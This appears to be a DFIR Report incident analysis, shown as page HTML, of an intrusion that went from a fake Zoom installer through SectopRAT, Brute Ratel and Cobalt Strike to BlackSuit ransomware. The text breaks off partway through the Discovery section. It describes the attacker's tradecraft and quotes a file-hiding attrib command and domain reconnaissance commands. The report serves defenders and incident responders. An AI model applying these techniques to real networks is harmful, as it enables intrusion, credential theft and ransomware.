+	<li role="menuitem" id="menu-item-49305" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children"><a class="menu-item-inner" href="https://thedfirreport.com/services/professional-services/" tabindex="0"><span class="avia-menu-text">Professional Services</span></a>
+	<ul role="menu" class="sub-menu">
+		<li role="menuitem" id="menu-item-49308" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/services/professional-services/integration/" tabindex="0"><span class="avia-menu-text">Integration</span></a></li>
+		<li role="menuitem" id="menu-item-49306" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/services/professional-services/cti-program-advisory/" tabindex="0"><span class="avia-menu-text">CTI Program Advisory</span></a></li>
+		<li role="menuitem" id="menu-item-49307" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/services/professional-services/incident-response-playbook/" tabindex="0"><span class="avia-menu-text">Incident Response Playbook</span></a></li>
+	</ul>
+</li>
+</ul>
+</li>
+<li role="menuitem" id="menu-item-49094" class="menu-title menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-top-level menu-item-top-level-4"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Company</span></span>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-49298" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/company/" tabindex="0"><span class="avia-menu-text">Company Overview</span></a></li>
+	<li role="menuitem" id="menu-item-49299" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/company/about-us/" tabindex="0"><span class="avia-menu-text">About us</span></a></li>
+	<li role="menuitem" id="menu-item-49302" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/company/contact-us/" tabindex="0"><span class="avia-menu-text">Contact Us</span></a></li>
+	<li role="menuitem" id="menu-item-49301" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/company/careers/" tabindex="0"><span class="avia-menu-text">Careers</span></a></li>
+</ul>
+</li>
+<li role="menuitem" id="menu-item-49097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-mega-parent  menu-item-top-level menu-item-top-level-5"><a class="menu-item-inner" href="/company/analysts/" tabindex="0"><span class="avia-menu-text">Analyst</span></a></li>
+<li role="menuitem" id="menu-item-49265" class="featured-post menu-item menu-item-type-post_type menu-item-object-post menu-item-top-level menu-item-top-level-6"><a class="menu-item-inner" href="https://thedfirreport.com/2023/12/04/sql-brute-force-leads-to-bluesky-ransomware/" tabindex="0"><span class="avia-menu-text">SQL Brute Force Leads to BlueSky Ransomware</span></a></li>
+<li role="menuitem" id="menu-item-49266" class="featured-post menu-item menu-item-type-post_type menu-item-object-post menu-item-top-level menu-item-top-level-7"><a class="menu-item-inner" href="https://thedfirreport.com/2024/04/01/from-onenote-to-ransomnote-an-ice-cold-intrusion/" tabindex="0"><span class="avia-menu-text">From OneNote to RansomNote: An Ice Cold Intrusion</span></a></li>
+</ul></div>		</div>
+	</div>
+</div>
+	<div id='main' class='all_colors' data-scroll-offset='88'>
+
+	
+<div class="single-content-section section--table-of-content avia-section main_color avia-section-default avia-no-border-styling container_wrap fullsize avia-builder-el-0 avia-builder-el-first">
+	<div class="container">
+		<div class="content">
+			<div class="entry-content-wrapper">
+				
+				<!-- Header Section -->
+				<div class="single-post-header">
+											<div class="single-post-thumbnail"><img width="1410" height="570" src="https://thedfirreport.com/wp-content/uploads/29354_020.png" class="wp-image-48791 avia-img-lazy-loading-48791 attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" /></div>
+					
+					<div class="single-post-header-content">
+						<div class="single-post-header-content-overlay"></div>
+						<div class='ep-post-terms'><a class='ep-item-term ep-item-term-blacksuit' href='https://thedfirreport.com/category/blacksuit/' >blacksuit</a></div>						<h1 class="entry-title">Fake Zoom Ends in BlackSuit Ransomware</h1>						<div class="single-post-meta">
+														<div class="single-post-date">
+								March 31, 2025							</div>
+						</div>
+					</div>
+				</div>
+
+				<!-- Main Content with Sidebar -->
+				<div class="glossary-columns">
+					
+					<!-- Sidebar Column -->
+					<div class="sidebar-container">
+						<div class="sidebar-inner inner-toc">
+							<!-- TOC will be generated here by JavaScript -->
+						</div>
+					</div>
+
+					<!-- Content Column -->
+					<div class="content-column">
+						
+<h2 class="wp-block-heading">Key Takeaways</h2>
+
+
+
+<ul class="wp-block-list">
+<li>The threat actor gained initial access by a fake Zoom installer that used d3f@ckloader and IDAT loader to drop SectopRAT.</li>
+
+
+
+<li>After nine days of dwell time, the SectopRAT malware dropped Cobalt Strike and Brute Ratel.</li>
+
+
+
+<li>Lateral movement was achieved using various remote services and later RDP. To facilitate RDP lateral movement the threat actor employed a malware with proxy capabilities known as QDoor.</li>
+
+
+
+<li>The threat actor used WinRAR to archive various files and then upload them to a cloud SaaS application named Bublup.</li>
+
+
+
+<li>Finally, the threat actor deployed and executed BlackSuit ransomware across all Windows systems, using PsExec.</li>
+</ul>
+<h2 class="wp-block-heading"><a href="https://thedfirreport.com/services/">The DFIR Report Services</a></h2>
+<p>Explore <a href="https://store.thedfirreport.com/products/blacksuit-ransomware-private-case-29354">this case</a> in-depth with our hands-on DFIR Labs!</p>
+<p>
+
+</p>
+<ul class="wp-block-list">
+<li><a href="https://thedfirreport.com/services/threat-intelligence/#threat-brief" target="_blank" rel="noreferrer noopener">Private Threat Briefs</a>: 20+ private DFIR reports annually.</li>
+
+
+
+<li><a href="https://thedfirreport.com/services/threat-intelligence/#threat-feed" target="_blank" rel="noreferrer noopener">Threat Feed</a>: Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc.</li>
+
+
+
+<li><a href="https://thedfirreport.com/services/threat-intelligence/#all-intel" target="_blank" rel="noreferrer noopener">All Intel</a>: Includes everything from Private Threat Briefs and Threat Feed, plus private events, Threat Actor Insights reports, long-term tracking, data clustering, and other curated intel.</li>
+
+
+
+<li><a href="https://thedfirreport.com/services/detection-rules/" target="_blank" rel="noreferrer noopener">Private Sigma Ruleset</a>: Features 170+ Sigma rules derived from 50+ cases, mapped to ATT&amp;CK with test examples.</li>
+
+
+
+<li><a href="https://thedfirreport.com/services/dfir-labs/" target="_blank" rel="noreferrer noopener">DFIR Labs</a>: Offers cloud-based, hands-on learning experiences, using real data, from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds.</li>
+</ul>
+
+<h4>Table of Contents:</h4>
+<ul>
+<li><a href="#case-summary">Case Summary</a></li>
+<li><a href="#services">Services</a></li>
+<li><a href="#analysts">Analysts</a></li>
+<li><a href="#initial-access">Initial Access</a></li>
+<li><a href="#execution">Execution</a></li>
+<li><a href="#persistence">Persistence</a></li>
+<li><a href="#defense-evasion">Defense Evasion</a></li>
+<li><a href="#credential-access">Credential Access</a></li>
+<li><a href="#discovery">Discovery</a></li>
+<li><a href="#lateral-movement">Lateral Movement</a></li>
+<li><a href="#collection">Collection</a></li>
+<li><a href="#command-and-control">Command and Control</a></li>
+<li><a href="#exfiltration">Exfiltration</a></li>
+<li><a href="#impact">Impact</a></li>
+<li><a href="#timeline">Timeline</a></li>
+<li><a href="#diamond-model">Diamond Model</a></li>
+<li><a href="#indicators">Indicators</a></li>
+<li><a href="#detections">Detections</a></li>
+<li><a href="#mitre">MITRE ATT&amp;CK</a></li>
+</ul>
+
+
+
+<h2 id="case-summary" class="wp-block-heading"><a href="#case-summary">Case Summary</a></h2>
+
+
+
+<p class="wp-block-paragraph">This case from May 2024 started with a malicious download from a website mimicking the teleconferencing application Zoom. When visiting the website and downloading a file that seems intended for installing Zoom, the user was, in fact, installing a malicious program created with Inno Setup.</p>
+
+
+
+<p class="wp-block-paragraph">The malicious program was a <a href="https://www.esentire.com/blog/d3f-ck-loader-the-new-maas-loader" target="_blank" rel="noreferrer noopener">d3f@ck loader</a> based on the Pascal scripting language and included several references to the subsequent stages in the execution chain, such as OneDrive, Telegram, and Steam. After executing a batch script to exclude the payload folder from Windows Defender and mark it as hidden, the program connected to a Steam Community page for the next stage IP address. </p>
+
+
+
+<p class="wp-block-paragraph">Two archive files were downloaded from this IP and extracted by another batch script. The script then proceeded to execute a payload from each archive. From one archive the script ran the legitimate Zoom installer so that the end user would get the program they thought they downloaded lowering the chances of the user reporting the event to IT or security staff.</p>
+
+
+
+<p class="wp-block-paragraph">The second payload executed was <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.hijackloader" target="_blank" rel="noreferrer noopener">IDAT loader</a> and an encrypted payload file, that resulted in the injection of SectopRAT into MSBuild.exe. The MSbuild.exe process called out to Pastebin to receive an IP address to use for it&#8217;s command and control endpoint. After this, command and control traffic was established and activity ceased for eight days.</p>
+
+
+
+<p class="wp-block-paragraph">On the ninth day of the intrusion, SectopRAT spawned a new command shell and executed a new payload. This was for a Brute Ratel payload, commonly referred to as &#8216;Badgers&#8217;. This Badger ran a series of Windows commands for discovery before executing a Cobalt Strike executable beacon. The Cobalt Strike beacon injected into a dllhost process and then was observed accessing LSASS memory.</p>
+
+
+
+<p class="wp-block-paragraph">After this, the threat actor began moving laterally using Cobalt Strike psexec_psh to launch a remote service for a PowerShell Cobalt beacon on a domain controller. Once on the domain controller they continued discovery actions using utilities like nltest, net, and systeminfo. They continued to run Cobalt Strike beacons across several more hosts throughout the environment, repeating the pattern observed on the domain controller.</p>
+
+
+
+<p class="wp-block-paragraph">On one domain controller and a backup server the threat actor dropped a binary svhost.exe. This file was a proxy tool know as QDoor. The threat actors executed this file using WMIC on the hosts and passed an IP address to provide a remote server for QDoor to proxy traffic to. Using this tunnel the threat actor proxied RDP traffic from their server to connect to hosts through the domain controller.</p>
+
+
+
+<p class="wp-block-paragraph">They first connected to a file share server where they used the Edge browser to download WinRAR. They then used WinRAR to create an archive of targeted file shares. They then exfiltrated these archives using the SaaS project management suite Bublup via the Edge browser.</p>
+
+
+
+<p class="wp-block-paragraph">Following this they then connected to the first domain controller via RDP. There they downloaded WinRAR again using the Edge browser, followed by a RAR archive from the temporary file sharing site <a href="http://temp.sh" target="_blank" rel="noreferrer noopener">temp.sh</a>. This RAR archive contained all the files needed to stage and deploy their ransomware.</p>
+
+
+
+<p class="wp-block-paragraph">After extracting the archive contents they began to proceed with ransomware deployment. They executed a batch file that copied the ransomware executable to remote hosts using a series of text files containing the remote targets using PsExec. This was followed with a second batch script that utilized the same text files and PsExec to run the ransomware on remote hosts.</p>
+
+
+
+<p class="wp-block-paragraph">The ransomware was BlackSuit, which after execution on the remote hosts it used vssadmin to delete shadow copies, encrypted the local files, and then drop a ransom note. After completing the remote ransomware deployment the threat actor used WMIC to execute the ransomware locally on the domain controller they used to stage the remote deployment. The Time to Ransomware (TTR) in this case was a little over 194 hours over nine calendar days.</p>
+
+
+
+
+
+<h2 id="analysts" class="wp-block-heading"><a href="#analysts">Analysts</a></h2>
+
+
+
+<p class="wp-block-paragraph">Analysis and reporting completed by <a href="https://x.com/pigerlin">@pigerlin</a>, UC1 and <a href="https://x.com/Miixxedup">@Miixxedup</a></p>
+
+
+
+<h2 id="initial-access" class="wp-block-heading"><a href="#initial-access">Initial Access</a></h2>
+
+
+
+<p class="wp-block-paragraph">This case starts with an initial tweet by ‘<a href="https://infosec.exchange/@crep1x" target="_blank" rel="noreferrer noopener">@crep1x</a>’ on X, showing the <a href="https://x.com/crep1x/status/1791043197721890870" target="_blank" rel="noreferrer noopener">following:</a></p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_001.png"><img decoding="async" class="aligncenter size-full wp-image-42831" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_001.png" alt="" width="613" height="332" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph" style="text-align: center;"><em>Figure 01 &#8211; initial tweet, mentioning the domain ‘zoommanager[.]com</em></p>
+
+
+
+<p class="wp-block-paragraph">Upon visiting zoommanager[.]com, the user was greeted with a cloned Zoom web page, offering the user to install Zoom, a popular teleconferencing tool.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_002.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42832" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_002.png" alt="" width="1022" height="627" /></a></p>
+
+
+
+<h1 class="wp-block-heading"> </h1>
+
+
+
+<p class="wp-block-paragraph" style="text-align: center;"><em>Figure 02 &#8211; Initial Malicious Zoom via zoommanager[.]com</em></p>
+
+
+
+<p class="wp-block-paragraph">Upon pressing the &#8216;Download&#8217; button, the victim downloads a malicious binary <em>Zoom_v_2.00.4.exe</em></p>
+
+
+
+<p class="wp-block-paragraph">The manner in which the victim arrived at this page was unclear in this case. Well-established methods for distribution include malicious advertising, such as in the ‘ads’ section of a Google search for terms like ‘Zoom’, or through access brokers who set up lures for popular tools to trick the victim into downloading the malware. </p>
+
+
+
+<p class="wp-block-paragraph">The cloned webpage was only slightly modified to include a small function at the top, loadlink(), which triggers a backend PHP script located at ./download/dwnl.php. This script was added as an on-click event to some of the ‘Download’ buttons.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_003.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42833" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_003.png" alt="" width="1124" height="295" /></a></p>
+
+
+
+
+
+<figure class="wp-block-image"></figure>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_004.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42834" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_004.png" alt="" width="1517" height="266" /></a></p>
+
+
+
+<p class="wp-block-paragraph">The threat actor didn’t replace all the links, as most links were still redirected to the legitimate Zoom domain. Also, some of the ‘download’ related functionality had not been replaced and was still referencing the legitimate Zoom page:</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_005.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42835" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_005.png" alt="" width="1600" height="316" /></a></p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_006.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42836" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_006.png" alt="" width="1592" height="337" /></a></p>
+
+
+
+
+
+
+
+<h2 id="execution" class="wp-block-heading"><a href="#execution">Execution</a></h2>
+
+
+
+<p class="wp-block-paragraph">The Zoom installer was created using <a href="https://jrsoftware.org/isinfo.php" target="_blank" rel="noreferrer noopener">Inno Setup</a>, a free installer for Windows programs, and served as the delivery mechanism for a multi-stage malware deployment and execution chain.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_007.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42837" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_007.png" alt="" width="1341" height="509" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">The trojanized installer was a downloader, more publicly known as “d3f@ckloader”, and is built upon the Pascal Scripting language. String analysis of the compiled code revealed references to various zip/cmd files, executables and URLs. The embedded URLs pointed to various platforms, including OneDrive, Telegram, and Steam.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_008.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42838" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_008.png" alt="" width="1399" height="654" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">Upon execution, the batch script 21.cmd was launched from the C:\Program Files\Windows NT directory. The script was no longer available on the beachhead system at the time of analysis however based on similar d3f@ckloader samples, we assess it was configured to set the ‘hidden’ attribute to all folders and files in the script’s running directory and add the root folder C: to Windows Defender&#8217;s exclusion list.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_009.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42839" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_009.png" alt="" width="1383" height="118" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">This data was observed in <a href="https://tria.ge/240515-1r69fseb94/behavioral2" target="_blank" rel="noreferrer noopener">sandbox executions</a> of the sample:</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_010.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42840" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_010.png" alt="" width="1498" height="373" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">The malware then established a connection to a Steam community profile page to obtain the IP address hosting the second-stage malware.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_011.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42841" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_011.png" alt="" width="1218" height="536" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">The Inno Download Plugin (idp.dll), a component of Inno Setup, was used to fetch two ZIP files from the remote IP address. The User-Agent associated with these web requests is very distinctive, making it a useful detection characteristic commonly identified by <strong>NIDS</strong>(network-based intrusion detection system) signatures.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_012.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42842" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_012.png" alt="" width="1219" height="94" /></a></p>
+
+
+
+
+
+<figure class="wp-block-image"></figure>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_013.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42843" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_013.png" alt="" width="1029" height="64" /></a></p>
+
+
+
+<p class="wp-block-paragraph">Following this, the batch script, named 4554.cmd was executed. It was configured to extract the contents of both zip files in the C:\Program Files\Windows NT directory and run two executables that were stored within those archives.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_014.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42844" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_014.png" alt="" width="522" height="325" /></a></p>
+
+
+
+
+
+<figure class="wp-block-image"></figure>
+<p><img loading="lazy" decoding="async" class="alignnone size-full wp-image-42979" src="https://thedfirreport.com/wp-content/uploads/2025/03/Untitled.png" alt="" width="1205" height="422" /></p>
+
+
+
+<p class="wp-block-paragraph">The first archive contained the executable 1522.exe and represented a benign Zoom installer, likely employed to mask the malicious activity and maintain user trust. In the second archive resided a collection of files, including a signed executable 152.exe, various DLL files that contain HijackLoader (aka IDAT loader) and its encrypted payload file, artillery.mdb.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_016.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42846" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_016.png" alt="" width="600" height="144" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">The execution flow of 152.exe parallels a previously reported instance, documented by <a href="https://www.rapid7.com/blog/post/2024/03/28/stories-from-the-soc-part-1-idat-loader-to-bruteratel/" target="_blank" rel="noreferrer noopener">Rapid7</a>, where a similar chain spawns an instance of cmd.exe and ultimately decrypts, loads and injects a SectopRAT payload into the MSBuild.exe process.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_017.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42847" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_017.png" alt="" width="1380" height="171" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">This injected MSBuild.exe process then reached out to pastebin to receive its C2 configuration.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_018.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42848" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_018.png" alt="" width="482" height="203" /></a></p>
+
+
+
+
+
+<figure class="wp-block-image"></figure>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_019.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42849" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_019.png" alt="" width="589" height="142" /></a></p>
+
+
+
+<p class="wp-block-paragraph">Execution graph:</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_020.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42850" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_020.png" alt="" width="1410" height="570" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph"><strong>Brute Ratel</strong></p>
+
+
+
+<p class="wp-block-paragraph">On the ninth day of the intrusion we observed the SectopRAT process spawn a new command shell and execute the DLL 2905.dll using regsvr32.exe .</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_021.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42851" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_021.png" alt="" width="1154" height="104" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">YARA rule-based memory scanning revealed binary patterns within the loaded process that are consistent with the Brute Ratel C4 framework.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_022.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42852" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_022.png" alt="" width="1191" height="702" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">One minute before the 2905.dll file was dropped to disk, another DLL, 3004.dll, was also dropped. This DLL was also a Brute Ratel Badger but had a different C2 configuration and was never executed during the intrusion. It is unclear if this was an oversight by the threat actor or was dropped by accident.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Cobalt Strike</strong></p>
+
+
+
+<p class="wp-block-paragraph">The same DLL was observed facilitating the execution of a Cobalt Strike beacon, run32.exe , that resided in Windows&#8217; temp directory.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_023.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42853" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_023.png" alt="" width="1145" height="481" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">Memory scans confirmed this executable as a Cobalt Strike beacon with several various YARA rule hits.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_024.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42854" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_024.png" alt="" width="941" height="576" /></a></p>
+
+
+
+
+
+<h2 id="persistence" class="wp-block-heading"><a href="#persistence">Persistence</a></h2>
+
+
+
+<p class="wp-block-paragraph">Upon execution of 152.exe, Hijackloader established persistence on the beachhead system by the creation of a startup entry:</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_025.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42855" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_025.png" alt="" width="1205" height="399" /></a></p>
+
+
+
+
+
+<h2 id="defense-evasion" class="wp-block-heading"><a href="#defense-evasion">Defense Evasion</a></h2>
+
+
+
+<p class="wp-block-paragraph">The Cobalt Strike beacon payload was successfully injected into the dllhost.exe process as indicated by Sysmon event id 10 in the screenshot below.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_026.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42856" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_026.png" alt="" width="916" height="261" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">During the initial loader execution the threat actor used the Windows <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/attrib" target="_blank" rel="noreferrer noopener">attrib</a> utility to change the attributes using the following command:</p>
+
+
+
+<pre class="wp-block-preformatted">attrib  +s +h /D "C:\Program Files\Windows NT\*.*"
+</pre>
+
+
+
+<p class="wp-block-paragraph">The command flags provided perform the following actions:</p>
+
+
+
+<ul class="wp-block-list">
+<li>+s Sets the System file attribute. If a file uses this attribute set, you must clear the attribute before you can change any other attributes for the file.</li>
+
+
+
+<li>+h Sets the Hidden file attribute. If a file uses this attribute set, you must clear the attribute before you can change any other attributes for the file.</li>
+
+
+
+<li>/D Applies <strong>attrib</strong> and any command-line options to directories.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">This would have hidden the initial access loader files from being visible when browsing via Explorer, lowering the chance of being discovered.</p>
+
+
+
+<p class="wp-block-paragraph">During the intrusion the threat actor dropped SectopRAT to disk in %USERPROFILE%\AppData\Local\Temp.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_027.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42857" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_027.png" alt="" width="640" height="386" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">This file was then loaded and executed in memory using MSbuild.exe. The same YARA rule triggered for both the on disk file and on the process memory for MSbuild.exe confirming the link.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_028.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42858" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_028.png" alt="" width="749" height="684" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">The MSbuild process was then observed being used for SectopRAT C2 communication covered further in the <a href="#command-and-control">Command and Control</a> section.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_029.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42859" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_029.png" alt="" width="543" height="353" /></a></p>
+
+
+
+
+
+<h2 id="credential-access" class="wp-block-heading"><a href="#credential-access">Credential Access</a></h2>
+
+
+
+<p class="wp-block-paragraph">Evidence from the intrusion shows that the Cobalt Strike pass-the-hash module was leveraged, resulting in a new cmd.exe process being spawned by dllhost.exe, which indicates a successful attempt to elevate privileges to the local &#8216;SYSTEM.&#8217;</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_030.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42860" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_030.png" alt="" width="645" height="459" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">Subsequently, the dllhost.exe process initiated a request for access to the LSASS process with the specific permissions mask of 0x1FFFFF (PROCESS_ALL_ACCESS). This access request pattern indicated an attempt to perform credential dumping from the LSASS process memory space.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_032.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42861" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_032.png" alt="" width="806" height="279" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">Indicative of this behavior is the 0x1FFFFF Granted access (full process access) and the UNKNOWN in the CallTrace:</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_033.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42862" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_033.png" alt="" width="732" height="82" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph"><em>CallStackTrace showing multiple offsets including ‘UNKNOWN’</em></p>
+
+
+
+<p class="wp-block-paragraph">Additional evidence of this activity included the use of Logon type 9 alongside an authentication type of seclogo strongly indicates credential use, akin to the runas command’s /netonly method, as used by Cobalt Strike’s ‘pass the hash’ technique. (<a href="https://www.cobaltstrike.com/blog/windows-access-tokens-and-alternate-credentials" target="_blank" rel="noreferrer noopener">CobaltstrikeWindows Access Tokens and Alternate Credentials | Cobalt Strike</a><a href="https://www.cobaltstrike.com/blog/windows-access-tokens-and-alternate-credentials" target="_blank" rel="noreferrer noopener">Windows Access Tokens and Alternate Credentials | Cobalt Strikecobaltstrike.com/blog/windows-access-tokens-and-alternate-credentials</a></p>
+
+
+
+<p class="wp-block-paragraph">).</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_034.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42863" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_034.png" alt="" width="616" height="753" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph"><strong>Rubeus</strong></p>
+
+
+
+<p class="wp-block-paragraph">During the intrusion the threat actor appeared to have tried to use Rubeus for credential access, based on YARA hits for the tool in the memory captures from the beachhead. It was discovered within the process memory space of the Brute Ratel Badger. The tool can perform a variety of credential access techniques and we were unable to identify any specific invocations indicating the methods attempted during this intrusion.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_035.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42864" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_035.png" alt="" width="1252" height="1054" /></a></p>
+
+
+
+
+
+<h2 id="discovery" class="wp-block-heading"><a href="#discovery">Discovery</a></h2>
+
+
+
+<p class="wp-block-paragraph">The threat actor initially ran hostname, followed by the following commands over a 30-minute time span. Notably, there was a considerable time difference between some of these commands:</p>
+
+
+
+<pre class="wp-block-preformatted">11:56 nltest /domain_trusts /all_trusts 
+11:58 net group ""domain admins"" /domain 
+00:07 net group ""Domain Computers"" /domain 
+00:15 net group /domain 
+00:18 systeminfo 
+00:21 whoami /groups 
+</pre>
+
+
+
+<p class="wp-block-paragraph">After this, the threat actor decided to drop a new access capability, a Cobalt Strike beacon. This beacon continued with a follow-up recon command:</p>
+
+
+
+<pre class="wp-block-preformatted">net group "domain admins" /domain 
+</pre>
+
+
+
